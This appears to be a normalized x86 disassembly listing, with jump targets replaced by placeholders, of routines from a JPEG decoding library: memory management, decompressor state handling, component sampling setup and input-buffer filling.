call sub_45a420
cmp [ ebx + 0x20 ] 0x0
je r-xdata
mov [ ebx + 0x1c ] edi
mov esi [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x18 ]
sub esi eax
sub edi eax
cmp edi esi
jbe r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov edx [ ebp - 0xc ]
push edx
push 0x0
mov ecx [ ebx ]
mov eax [ ecx + esi * 4 ]
push eax
call sub_46a318
add esp 0xc
inc esi
cmp edi esi
ja r-xdata
jmp r-xdata
sub_45a6c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
add edi eax
cmp edi [ ebx + 0x4 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp eax [ ebx + 0xc ]
ja r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
add eax [ ebx + 0x10 ]
cmp edi eax
jbe r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x1c ]
cmp edi eax
jbe r-xdata
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x18 ]
jbe r-xdata
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a4cc
xor ecx ecx
mov [ ebx + 0x24 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax edi
sub eax [ ebx + 0x10 ]
test eax eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebx + 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebx + 0x18 ]
shl eax 0x2
add eax [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x24 ] 0x1
mov esi [ ebx + 0x1c ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x18 ] eax
xor eax eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a4cc
cmp [ ebx + 0x20 ] 0x0
je r-xdata
mov [ ebx + 0x1c ] edi
mov esi [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
shl eax 0x7
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x18 ]
sub esi eax
sub edi eax
cmp edi esi
jbe r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov edx [ ebp - 0xc ]
push edx
push 0x0
mov ecx [ ebx ]
mov eax [ ecx + esi * 4 ]
push eax
call sub_46a318
add esp 0xc
inc esi
cmp edi esi
ja r-xdata
jmp r-xdata
sub_45a814
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] edx
mov edi eax
mov esi [ edi + 0x4 ]
cmp [ esp ] 0x0
jl r-xdata
mov eax [ edi ]
mov [ eax + 0x14 ] 0xc
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp [ esp ] 0x2
jl r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ esi + ecx * 4 + 0x38 ]
xor ecx ecx
mov [ esi + edx * 4 + 0x38 ] ecx
test eax eax
je r-xdata
mov ebx [ esi + 0x40 ]
test ebx ebx
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov edx [ esp ]
mov eax [ esi + edx * 4 + 0x30 ]
mov edx [ esp ]
xor ecx ecx
mov [ esi + edx * 4 + 0x30 ] ecx
test eax eax
je r-xdata
mov edx [ eax ]
mov [ esp + 0x4 ] edx
mov edx eax
mov ebx [ eax + 0x4 ]
add ebx [ eax + 0x8 ]
mov eax edi
add ebx 0xc
mov ecx ebx
call sub_45aa54
mov eax [ esi + 0x48 ]
sub eax ebx
mov [ esi + 0x48 ] eax
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
xor edx edx
mov [ esi + 0x40 ] edx
mov ebx [ esi + 0x44 ]
test ebx ebx
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ esp + 0x8 ] edx
mov edx eax
mov ebx [ eax + 0x4 ]
add ebx [ eax + 0x8 ]
mov eax edi
add ebx 0xc
mov ecx ebx
call sub_45aa44
mov eax [ esi + 0x48 ]
sub eax ebx
mov [ esi + 0x48 ] eax
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
xor edx edx
mov [ esi + 0x44 ] edx
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
xor eax eax
lea edx [ ebx + 0x30 ]
mov [ ebx + 0x28 ] eax
mov eax edi
call [ ebx + 0x38 ]
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
xor eax eax
lea edx [ ebx + 0x30 ]
mov [ ebx + 0x28 ] eax
mov eax edi
call [ ebx + 0x38 ]
sub_45a918
push ebx
push esi
mov esi eax
mov ebx 0x1
mov edx ebx
mov eax esi
call sub_45a814
dec ebx
test ebx ebx
jge r-xdata
mov ecx 0x50
mov edx [ esi + 0x4 ]
mov eax esi
call sub_45aa44
xor ecx ecx
mov eax esi
mov [ esi + 0x4 ] ecx
call sub_45aa7c
pop esi
pop ebx
retn
sub_45a950
push ebx
push esi
push edi
mov esi eax
xor eax eax
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax 0x3b9aca00
cmp eax 0x3b9aca00
je r-xdata
mov eax esi
call sub_45aa78
mov edi eax
mov edx 0x50
mov eax esi
call sub_45aa3c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx [ esi ]
mov eax esi
mov [ edx + 0x14 ] 0x3
mov edx [ eax ]
call [ edx ]
mov [ ebx ] sub_459e34
mov edx 0x1
mov [ ebx + 0x4 ] sub_459f64
mov [ ebx + 0x8 ] sub_45a004
mov [ ebx + 0xc ] sub_45a0d8
mov [ ebx + 0x10 ] sub_45a1bc
mov [ ebx + 0x14 ] sub_45a224
mov [ ebx + 0x18 ] sub_45a28c
mov [ ebx + 0x1c ] sub_45a57c
mov [ ebx + 0x20 ] sub_45a6c8
mov [ ebx + 0x24 ] sub_45a814
mov [ ebx + 0x28 ] sub_45a918
mov [ ebx + 0x2c ] edi
lea eax [ ebx + 0x34 ]
mov eax esi
call sub_45aa7c
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] 0x35
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
xor ecx ecx
dec edx
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
add eax 0xfffffffc
test edx edx
jge r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] edx
mov [ ebx + 0x48 ] 0x50
mov [ esi + 0x4 ] ebx
pop edi
pop esi
pop ebx
retn
sub_45aa80
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x1c ] 0xffdc
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x28
mov [ eax + 0x18 ] 0xffdc
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x18 ] 0xffdc
jle r-xdata
cmp [ ebx + 0x20 ] 0xa
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xd
mov edx [ ebx + 0xd0 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0xd0 ] 0x8
je r-xdata
mov [ ebx + 0x126 ] 0x1
mov [ ebx + 0x12a ] 0x1
xor edi edi
mov esi [ ebx + 0xd4 ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov edx [ ebx + 0x20 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi [ ebx + 0x20 ]
jl r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
mov [ ebx + 0x12e ] 0x8
xor edi edi
mov esi [ ebx + 0xd4 ]
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x10
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jg r-xdata
cmp edi [ ebx + 0x20 ]
jl r-xdata
mov eax [ esi + 0x8 ]
mov eax [ ebx + 0x126 ]
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x24 ] 0x8
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x126 ]
imul [ esi + 0x8 ]
shl ecx 0x3
inc edi
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0x12a ]
imul [ esi + 0xc ]
shl ecx 0x3
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x126 ]
imul [ esi + 0x8 ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x28 ] eax
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0x12a ]
imul [ esi + 0xc ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x2c ] eax
xor eax eax
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x4c ] eax
add esi 0x54
mov ecx [ ebx + 0x12a ]
shl ecx 0x3
mov eax ecx
add eax [ ebx + 0x1c ]
dec eax
cdq
idiv ecx
mov [ ebx + 0x132 ] eax
mov ecx [ ebx + 0x13a ]
cmp ecx [ ebx + 0x20 ]
jl r-xdata
mov ecx [ esi + 0xc ]
mov ecx [ ebx + 0x12a ]
jmp r-xdata
mov [ ebx + 0x126 ] eax
mov edx [ ebx + 0x12a ]
cmp edx [ esi + 0xc ]
jle r-xdata
cmp [ esi + 0xc ] 0x4
jle r-xdata
mov eax [ ebx + 0x1a6 ]
mov [ eax + 0x10 ] 0x1
jmp r-xdata
cmp [ ebx + 0xd8 ] 0x0
je r-xdata
mov [ ebx + 0x12a ] ecx
inc edi
add esi 0x54
mov ecx [ ebx + 0x126 ]
cmp ecx [ esi + 0x8 ]
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x1a6 ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
sub_45ac4c
push ebx
mov ebx eax
push esi
push edi
push ecx
cmp [ ebx + 0x13a ] 0x1
jne r-xdata
mov eax [ ebx + 0x13a ]
test eax eax
jle r-xdata
mov ecx [ ebx + 0x13e ]
mov eax [ ecx + 0x1c ]
mov [ ebx + 0x14e ] eax
mov edx [ ecx + 0x20 ]
mov [ ebx + 0x152 ] edx
xor edx edx
mov [ ecx + 0x34 ] 0x1
mov [ ecx + 0x38 ] 0x1
mov [ ecx + 0x3c ] 0x1
mov eax [ ecx + 0x24 ]
mov [ ecx + 0x40 ] eax
mov [ ecx + 0x44 ] 0x1
mov eax [ ecx + 0x20 ]
mov esi [ ecx + 0xc ]
div esi
mov eax edx
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov edx [ ebx + 0x13a ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jle r-xdata
mov [ ecx + 0x48 ] eax
xor edx edx
mov [ ebx + 0x156 ] 0x1
mov [ ebx + 0x15a ] edx
jmp r-xdata
mov eax esi
cmp esi [ ebx + 0x13a ]
jl r-xdata
mov ecx [ ebx + 0x126 ]
shl ecx 0x3
mov eax ecx
add eax [ ebx + 0x18 ]
dec eax
cdq
idiv ecx
mov [ ebx + 0x14e ] eax
mov ecx [ ebx + 0x12a ]
shl ecx 0x3
mov eax ecx
add eax [ ebx + 0x1c ]
dec eax
cdq
idiv ecx
mov [ ebx + 0x152 ] eax
xor ecx ecx
mov [ ebx + 0x156 ] ecx
xor esi esi
lea eax [ ebx + 0x13e ]
mov [ esp ] eax
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x34 ] eax
mov eax [ ecx + 0xc ]
mov [ ecx + 0x38 ] eax
mov edx [ ecx + 0x34 ]
imul edx eax
mov [ ecx + 0x3c ] edx
mov eax [ ecx + 0x34 ]
imul [ ecx + 0x24 ]
mov [ ecx + 0x40 ] eax
xor edx edx
mov eax [ ecx + 0x1c ]
mov edi [ ecx + 0x34 ]
div edi
mov eax edx
test eax eax
jne r-xdata
mov [ ecx + 0x44 ] eax
xor edx edx
mov eax [ ecx + 0x20 ]
mov edi [ ecx + 0x38 ]
div edi
mov eax edx
test eax eax
jne r-xdata
mov eax edi
mov [ ecx + 0x48 ] eax
mov edi [ ecx + 0x3c ]
mov eax [ ebx + 0x156 ]
add eax edi
cmp eax 0xa
jle r-xdata
mov eax edi
mov eax edi
add edi 0xffffffff
test eax eax
jg r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0xb
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov ecx [ ebx + 0x156 ]
inc [ ebx + 0x156 ]
mov [ ebx + ecx * 4 + 0x15a ] esi
inc esi
add [ esp ] 0x4
sub_45add8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
xor eax eax
mov [ esp ] eax
lea edx [ ebx + 0x13e ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ esp ]
cmp edx [ ebx + 0x13a ]
jl r-xdata
mov ecx [ esp + 0x4 ]
mov esi [ ecx ]
cmp [ esi + 0x4c ] 0x0
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp ]
add [ esp + 0x4 ] 0x4
mov edi [ esi + 0x10 ]
test edi edi
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x33
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi 0x4
jge r-xdata
cmp [ ebx + edi * 4 + 0xa0 ] 0x0
jne r-xdata
mov eax ebx
mov ecx 0x84
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov ebp eax
push 0x84
mov eax [ ebx + edi * 4 + 0xa0 ]
push eax
push ebp
call sub_46a330
add esp 0xc
mov [ esi + 0x4c ] ebp
sub_45ae70
push ebx
mov ebx eax
mov eax ebx
call sub_45ac4c
mov eax ebx
call sub_45add8
mov eax ebx
mov edx [ eax + 0x1ae ]
call [ edx ]
mov eax ebx
mov edx [ eax + 0x19e ]
call [ edx ]
mov ecx [ ebx + 0x19e ]
mov edx [ ebx + 0x1a6 ]
mov eax [ ecx + 0x4 ]
mov [ edx ] eax
pop ebx
retn
sub_45aeb8
push ebx
mov ebx eax
push esi
push edi
mov esi [ ebx + 0x1a6 ]
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1aa ]
call [ edx + 0x4 ]
mov edi eax
mov eax edi
sub eax 0x1
jb r-xdata
mov eax 0x2
jmp r-xdata
mov eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x18 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_45aa80
xor edx edx
mov [ esi + 0x18 ] edx
jmp r-xdata
mov [ esi + 0x14 ] 0x1
cmp [ esi + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_45ae70
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x22
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8c ]
cmp eax [ ebx + 0x94 ]
jge r-xdata
mov edx [ ebx + 0x1aa ]
cmp [ edx + 0x54 ] 0x0
je r-xdata
mov [ ebx + 0x94 ] eax
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x3a
mov edx [ eax ]
call [ edx ]
jmp r-xdata
sub_45af64
push ebx
mov ebx eax
xor edx edx
xor ecx ecx
mov eax [ ebx + 0x1a6 ]
mov [ eax ] sub_45aeb8
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x1aa ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0x9c ] ecx
pop ebx
retn
sub_45afa0
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x1c
xor edx edx
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1a6 ] eax
mov [ eax ] sub_45aeb8
mov [ eax + 0x4 ] sub_45af64
mov [ eax + 0x8 ] sub_45ae70
mov [ eax + 0xc ] sub_45aea8
xor edx edx
xor ecx ecx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] 0x1
pop esi
pop ebx
retn
sub_45aff4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x14 ]
mov eax [ ebx + 0x1c ]
push eax
push 0x1000
push 0x1
mov edx [ ebx + 0x20 ]
push edx
call sub_46a344
add esp 0x10
test eax eax
ja r-xdata
mov edx [ ebx + 0x20 ]
xor ecx ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] eax
mov eax 0x1
mov [ ebx + 0x24 ] ecx
pop esi
pop ebx
retn
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov ecx [ esi ]
mov eax esi
or edx 0xffffffff
mov [ ecx + 0x14 ] 0x74
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x20 ]
mov [ eax ] 0xff
mov [ eax + 0x1 ] 0xd9
mov eax 0x2
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x29
mov edx [ eax ]
call [ edx ]
sub_45b064
push ebx
push esi
push edi
mov edi eax
mov ebx edx
test ebx ebx
mov esi [ edi + 0x14 ]
jle r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp ebx eax
jg r-xdata
sub ebx eax
mov eax edi
call sub_45aff4
add [ esi ] ebx
sub [ esi + 0x4 ] ebx
sub_45b094
push ebx
push esi
mov esi eax
push edi
push ebp
mov edi edx
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ebx [ esi + 0x14 ]
xor eax eax
xor edx edx
mov [ ebx + 0x8 ] sub_45afe8
mov [ ebx + 0xc ] sub_45aff4
mov [ ebx + 0x10 ] sub_45b064
mov [ ebx + 0x14 ] sub_4642e0
mov [ ebx + 0x18 ] sub_45b090
mov [ ebx + 0x1c ] edi
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov ecx 0x28
xor edx edx
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
mov eax esi
mov [ esi + 0x14 ] ebx
mov ecx 0x1000
mov ebp [ eax + 0x4 ]
xor edx edx
call [ ebp ]
mov [ ebx + 0x20 ] eax
sub_45b100
push ebx
mov ebx eax
cmp [ ebx + 0x10 ] 0xca
jne r-xdata
cmp [ ebx + 0x10 ] 0xcb
jne r-xdata
mov eax ebx
call sub_45bba4
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x10 ] 0xcc
je r-xdata
mov edx [ ebx + 0x1a6 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0xcb
mov [ ebx + 0x10 ] 0xcf
mov eax 0x1
pop ebx
retn
mov eax ebx
call sub_45b1c8
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx [ ebx + 0x8c ]
mov [ ebx + 0x94 ] ecx
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
cmp eax 0x2
je r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp eax 0x3
je r-xdata
mov edx [ ebx + 0x8 ]
inc [ edx + 0x4 ]
mov ecx [ edx + 0x4 ]
mov eax [ ebx + 0x8 ]
cmp ecx [ eax + 0x8 ]
jl r-xdata
dec eax
jne r-xdata
mov edx [ ebx + 0x132 ]
add [ eax + 0x8 ] edx
jmp r-xdata
sub_45b1c8
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x10 ] 0xcc
je r-xdata
mov eax [ ebx + 0x196 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax + 0x196 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0x88 ] ecx
mov [ ebx + 0x10 ] 0xcc
jmp r-xdata
mov edx [ ebx + 0x88 ]
cmp edx [ ebx + 0x70 ]
jb r-xdata
cmp [ ebx + 0x40 ] 0x0
mov edx 0xce
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax + 0x196 ]
call [ edx + 0x4 ]
mov eax ebx
mov edx [ eax + 0x196 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0x88 ] ecx
mov [ ebx + 0x10 ] edx
mov eax 0x1
dec edx
mov eax ebx
mov esi [ ebx + 0x88 ]
push 0x0
lea ecx [ ebx + 0x88 ]
mov edi [ eax + 0x19a ]
xor edx edx
call [ edi + 0x4 ]
cmp esi [ ebx + 0x88 ]
jne r-xdata
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x70 ]
mov [ eax + 0x8 ] edx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b284
push ebx
mov ebx eax
push esi
push edi
push ecx
mov edi ecx
cmp [ ebx + 0x10 ] 0xcd
mov esi edx
je r-xdata
mov ecx [ ebx + 0x88 ]
cmp ecx [ ebx + 0x70 ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x77
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
xor ecx ecx
mov eax ebx
mov [ esp ] ecx
push edi
mov edx esi
mov esi [ eax + 0x19a ]
lea ecx [ esp + 0x4 ]
call [ esi + 0x4 ]
mov eax [ esp ]
add [ ebx + 0x88 ] eax
mov eax [ esp ]
mov edx [ ebx + 0x88 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x70 ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_45b314
push ebx
mov ebx eax
push esi
push edi
push ebp
mov ebp ecx
cmp [ ebx + 0x10 ] 0xce
mov edi edx
je r-xdata
mov ecx [ ebx + 0x88 ]
cmp ecx [ ebx + 0x70 ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x77
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x12a ]
imul esi [ ebx + 0x12e ]
cmp esi ebp
jbe r-xdata
mov edx [ ebx + 0x88 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x70 ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
mov ecx [ eax + 0x19e ]
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x15
mov eax ebx
mov edx [ eax ]
call [ edx ]
add [ ebx + 0x88 ] esi
mov eax esi
xor eax eax
jmp r-xdata
sub_45b3c0
push ebx
mov ebx eax
push esi
mov esi edx
mov eax [ ebx + 0x10 ]
cmp eax 0xcf
je r-xdata
test esi esi
jg r-xdata
cmp eax 0xcc
je r-xdata
mov eax [ ebx + 0x1a6 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi 0x1
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x94 ] esi
mov eax ebx
call sub_45b1c8
pop esi
pop ebx
retn
cmp esi [ ebx + 0x8c ]
jle r-xdata
mov esi [ ebx + 0x8c ]
sub_45b420
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp eax 0xcd
je r-xdata
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp eax 0xce
jne r-xdata
cmp [ ebx + 0x10 ] 0xd0
je r-xdata
mov eax ebx
mov edx [ eax + 0x196 ]
call [ edx + 0x4 ]
mov [ ebx + 0x10 ] 0xd0
jmp r-xdata
mov edx [ ebx + 0x8c ]
cmp edx [ ebx + 0x94 ]
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov [ ebx + 0x10 ] 0xcf
mov eax 0x1
pop ebx
retn
mov ecx [ ebx + 0x1a6 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx ]
test eax eax
jne r-xdata
xor eax eax
pop ebx
retn
sub_45b4a8
push ebx
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ eax + 0x122 ] 0x0
je r-xdata
cmp [ eax + 0x24 ] 0x3
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ eax + 0x20 ] 0x3
jne r-xdata
cmp [ eax + 0x28 ] 0x2
jne r-xdata
cmp [ eax + 0x74 ] 0x3
je r-xdata
mov edx [ eax + 0xd4 ]
cmp [ edx + 0x8 ] 0x2
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ edx + 0x5c ] 0x1
jne r-xdata
cmp [ edx + 0xb0 ] 0x1
jne r-xdata
cmp [ edx + 0xc ] 0x2
jg r-xdata
cmp [ edx + 0x60 ] 0x1
jne r-xdata
cmp [ edx + 0xb4 ] 0x1
je r-xdata
mov edx [ eax + 0xd4 ]
mov ebx [ edx + 0x24 ]
mov ecx [ eax + 0x12e ]
cmp ebx ecx
jne r-xdata
xor eax eax
pop ebx
retn
cmp ecx [ edx + 0x78 ]
jne r-xdata
cmp ecx [ edx + 0xcc ]
je r-xdata
mov eax 0x1
pop ebx
retn
sub_45b538
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x10 ] 0xca
je r-xdata
mov ecx [ ebx + 0x2c ]
shl ecx 0x3
cmp ecx [ ebx + 0x30 ]
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx [ ebx + 0x2c ]
shl ecx 0x2
cmp ecx [ ebx + 0x30 ]
ja r-xdata
mov eax [ ebx + 0x18 ]
add eax 0x7
test eax eax
jns r-xdata
mov ecx [ ebx + 0x2c ]
add ecx ecx
cmp ecx [ ebx + 0x30 ]
ja r-xdata
mov eax [ ebx + 0x18 ]
add eax 0x3
test eax eax
jns r-xdata
sar eax 0x3
mov [ ebx + 0x6c ] eax
mov edx [ ebx + 0x1c ]
add edx 0x7
test edx edx
jns r-xdata
add eax 0x7
